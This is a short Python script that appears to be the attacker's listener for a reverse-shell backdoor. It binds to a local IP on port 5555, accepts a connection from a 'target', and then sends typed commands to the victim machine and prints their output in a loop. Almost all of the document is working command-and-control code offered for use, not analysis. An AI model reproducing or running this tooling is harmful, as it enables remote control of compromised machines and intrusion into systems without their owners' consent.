import socket
import json
import os

def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())
     
def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue
            
    
def target_communication():
    while True:
        command = input("Shell ~~%s: " %str(ip))
        reliable_send(command)
        if command == "quit":
            break
        elif command[:3] == 'cd ':
            pass      
        elif command == 'clear':
            os.system('clear')
        else:
            result = reliable_recv()
            print(result)


sock = socket.socket(socket.AF_INET ,socket.SOCK_STREAM)

sock.bind(('192.168.1.103',5555))
print("Listening for incoming connectins ")
sock.listen(5)

target , ip = sock.accept()
print('Target connected from :'+str(ip))

target_communication()
